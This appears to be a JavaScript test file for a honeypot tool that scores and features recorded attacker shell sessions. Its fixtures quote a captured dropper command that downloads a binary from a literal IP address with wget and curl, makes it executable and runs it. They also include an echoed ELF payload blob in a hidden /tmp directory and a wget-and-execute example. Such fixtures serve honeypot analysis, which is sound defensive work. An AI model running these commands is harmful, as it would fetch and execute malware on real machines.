const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const { scoreSession, pickFeatured, verbsOf } = require('../lib/featured');

// A real dropper one-liner from this honeypot (trimmed): the usual shape of
// an attack here.
const DROPPER_LINE =
  'cd /tmp || cd /run || cd /var/run; wget http://45.198.224.34/ssh; curl -O http://45.198.224.34/ssh; ' +
  'chmod 777 ssh; sh ssh; rm -rf ssh';

const STORY = ['uname -a', 'cat /proc/cpuinfo', DROPPER_LINE];

// What the first version of the new picker featured in production: a
// honeypot fingerprinting script, forty printf variations of one check.
const PROBE = Array.from({ length: 40 }, (_, i) =>
  i % 2
    ? `printf '\\n%s|%s\\n' 'check_53245978362c_${i}' "$((348*112+${i}))"`
    : `sh -c 'printf x check_${i}'`
);

// What the original picker featured: binaries pushed through echo.
const BLOBBY = [
  'sh -s', 'mkdir -p /tmp/.x; cd /tmp/.x', 'uname -a',
  ...Array.from({ length: 6 }, (_, i) => `echo ${'f0VMRgIBAQAAAAAAAAAA'.repeat(50)}${i} >> .b`),
];

describe('verbsOf', () => {
  test('finds each program a command runs, without wrappers or paths', () => {
    assert.deepEqual(verbsOf('cd /tmp; wget http://x.example/a && chmod +x a; ./a'), ['cd', 'wget', 'chmod', 'a']);
    assert.deepEqual(verbsOf('sudo /bin/busybox cat /proc/cpuinfo | grep name'), ['cat', 'grep']);
    assert.deepEqual(verbsOf("sh -c 'uname -a'"), ['uname']);
  });

  test('ignores shell keywords and names that are not program-shaped', () => {
    const keywords = verbsOf('if [ -f x ]; then rm x; fi; for f in a b; do echo $f; done');
    assert.ok(!keywords.some((v) => ['if', 'then', 'fi', 'for', 'do', 'done'].includes(v)), JSON.stringify(keywords));
    const verbs = verbsOf('f_check_53245978362c15f8305192c19ff5de39() { printf x; }');
    assert.ok(!verbs.some((v) => v.startsWith('f_check')), JSON.stringify(verbs));
  });
});

describe('scoreSession', () => {
  test('fewer than three distinct programs is not an attack worth replaying', () => {
    assert.equal(scoreSession(['uname -a', 'uname -a']), null);
    assert.equal(scoreSession(PROBE), null);
    assert.equal(scoreSession([]), null);
  });

  test('a single dropper one-liner qualifies on its own', () => {
    assert.ok(scoreSession([DROPPER_LINE]) > 0);
  });

  test('ignores empty and non-string entries', () => {
    assert.equal(scoreSession(['', null, '  ', 'ls']), null);
  });

  test('a download outscores the same session without one', () => {
    assert.ok(scoreSession(STORY) > scoreSession(['uname -a', 'cat /proc/cpuinfo', 'id; whoami; w']));
  });

  test('payload blobs cost more than their extra commands earn', () => {
    assert.ok(scoreSession(['uname -a', 'cat /proc/cpuinfo', 'id']) > scoreSession(BLOBBY));
  });
});

describe('pickFeatured', () => {
  test('prefers a real attack over a probe script and over a blob dropper', () => {
    assert.equal(
      pickFeatured([
        { session_id: 'probe', commands: PROBE },
        { session_id: 'blobby', commands: BLOBBY },
        { session_id: 'story', commands: STORY },
      ]),
      'story'
    );
  });

  test('returns null when nothing qualifies', () => {
    assert.equal(pickFeatured([{ session_id: 'p', commands: PROBE }]), null);
    assert.equal(pickFeatured([]), null);
  });
});
